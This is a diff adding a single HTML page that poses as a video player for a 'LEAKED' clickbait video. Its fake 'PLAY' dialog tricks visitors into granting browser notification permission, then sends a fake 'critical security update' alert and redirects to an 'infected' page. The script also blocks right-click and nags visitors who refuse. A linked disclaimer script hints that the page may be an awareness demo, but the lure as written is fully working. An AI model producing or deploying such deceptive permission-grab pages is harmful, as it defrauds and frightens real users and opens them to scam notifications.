@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Video Player</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #000;
+      font-family: Arial, Helvetica, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .player-wrap {
+      width: 100%;
+      max-width: 640px;
+      position: relative;
+    }
+    .player {
+      width: 100%;
+      aspect-ratio: 16/9;
+      background: #111;
+      position: relative;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .player-gradient {
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      height: 60px;
+      background: linear-gradient(transparent, rgba(0,0,0,0.7));
+    }
+    .play-btn {
+      width: 68px;
+      height: 48px;
+      background: rgba(255,0,0,0.85);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      transition: background 0.2s;
+      z-index: 1;
+    }
+    .play-btn:hover { background: rgba(255,0,0,1); }
+    .play-btn svg { fill: #fff; width: 24px; height: 24px; margin-left: 3px; }
+    .controls {
+      background: rgba(0,0,0,0.85);
+      padding: 8px 12px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    .ctrl-icon { color: #fff; font-size: 18px; cursor: pointer; }
+    .time { color: #aaa; font-size: 12px; white-space: nowrap; }
+    .progress {
+      flex: 1;
+      height: 3px;
+      background: #444;
+      border-radius: 2px;
+      position: relative;
+    }
+    .progress-buf { position: absolute; height: 100%; width: 15%; background: #666; border-radius: 2px; }
+    .progress-fill { position: absolute; height: 100%; width: 0%; background: #f00; border-radius: 2px; }
+    .vol { width: 50px; height: 3px; background: #444; border-radius: 2px; position: relative; }
+    .vol-fill { position: absolute; height: 100%; width: 70%; background: #fff; border-radius: 2px; }
+    .title-bar {
+      padding: 10px 0;
+      width: 100%;
+      max-width: 640px;
+    }
+    .vid-title {
+      color: #fff;
+      font-size: 16px;
+      font-weight: 500;
+      margin-bottom: 4px;
+    }
+    .vid-meta { color: #aaa; font-size: 12px; }
+
+    .dialog-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .dialog {
+      background: #fff;
+      border-radius: 8px;
+      width: 320px;
+      overflow: hidden;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.3);
+      animation: dialogPop 0.2s ease-out;
+    }
+    @keyframes dialogPop { from { transform: scale(0.95); opacity: 0; } }
+    .dialog-body {
+      padding: 20px;
+      display: flex;
+      gap: 14px;
+      align-items: flex-start;
+    }
+    .dialog-icon {
+      width: 40px;
+      height: 40px;
+      background: #ff0000;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+    }
+    .dialog-icon svg { fill: #fff; width: 24px; height: 24px; }
+    .dialog-title {
+      font-size: 15px;
+      font-weight: 600;
+      color: #1a1a1a;
+      margin-bottom: 2px;
+    }
+    .dialog-text {
+      font-size: 13px;
+      color: #555;
+      line-height: 1.4;
+    }
+    .dialog-close {
+      position: absolute;
+      top: 12px;
+      right: 16px;
+      background: none;
+      border: none;
+      font-size: 20px;
+      color: #999;
+      cursor: pointer;
+      line-height: 1;
+    }
+    .dialog-actions {
+      display: flex;
+      justify-content: flex-end;
+      gap: 8px;
+      padding: 12px 20px;
+      border-top: 1px solid #eee;
+    }
+    .btn {
+      padding: 8px 20px;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      border: none;
+      font-family: inherit;
+    }
+    .btn-cancel {
+      background: none;
+      color: #1a73e8;
+    }
+    .btn-play {
+      background: #1a73e8;
+      color: #fff;
+    }
+    .btn-play:hover { background: #1557b0; }
+
+    .prompt-text {
+      color: #888;
+      font-family: 'Courier New', monospace;
+      font-size: 16px;
+      margin-top: 20px;
+      text-align: center;
+      display: none;
+      animation: fadeIn 0.5s;
+    }
+    @keyframes fadeIn { from { opacity: 0; } }
+
+    @media (max-width: 480px) {
+      .dialog { width: 90%; }
+      .vid-title { font-size: 14px; }
+      .title-bar { padding: 10px 12px; }
+    }
+  </style>
+</head>
+<body>
+  <div class="player-wrap">
+    <div class="player" id="player">
+      <div class="play-btn" onclick="showDialog()">
+        <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+      </div>
+      <div class="player-gradient"></div>
+    </div>
+    <div class="controls">
+      <span class="ctrl-icon">▶</span>
+      <span class="time">0:00 / 12:47</span>
+      <div class="progress">
+        <div class="progress-buf"></div>
+        <div class="progress-fill"></div>
+      </div>
+      <span class="ctrl-icon">🔊</span>
+      <div class="vol"><div class="vol-fill"></div></div>
+      <span class="ctrl-icon">⛶</span>
+    </div>
+    <div class="title-bar">
+      <div class="vid-title">LEAKED: Full Video (HD) - Must Watch Before Deleted</div>
+      <div class="vid-meta">2,847,291 views • 3 hours ago</div>
+    </div>
+  </div>
+
+  <div class="prompt-text" id="promptText">Press "Allow" to start the video</div>
+
+  <div class="dialog-overlay" id="dialogOverlay" style="display:none">
+    <div class="dialog">
+      <div class="dialog-body">
+        <div class="dialog-icon">
+          <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+        </div>
+        <div>
+          <div class="dialog-title">Your Video Is Ready</div>
+          <div class="dialog-text">Press Play to start the video</div>
+        </div>
+      </div>
+      <div class="dialog-actions">
+        <button class="btn btn-cancel" onclick="closeDialog()">Cancel</button>
+        <button class="btn btn-play" onclick="requestNotif()">PLAY</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    function showDialog() {
+      document.getElementById("dialogOverlay").style.display = "flex";
+    }
+    function closeDialog() {
+      document.getElementById("dialogOverlay").style.display = "none";
+    }
+    function requestNotif() {
+      document.getElementById("dialogOverlay").style.display = "none";
+      document.getElementById("promptText").style.display = "block";
+
+      Notification.requestPermission().then(p => {
+        if (p === "granted") {
+          new Notification("Your phone needs attention!", {
+            body: "Critical security update available. Tap to install now.",
+          });
+          location.href = "/tetapux/pages/infected.html";
+        } else {
+          document.getElementById("promptText").textContent = 'Notifications blocked. Clear permissions and try again.';
+        }
+      });
+    }
+    document.addEventListener("contextmenu", e => e.preventDefault());
+  </script>
+  <script src="/tetapux/disclaimer.js" async></script>
+</body>
+</html>
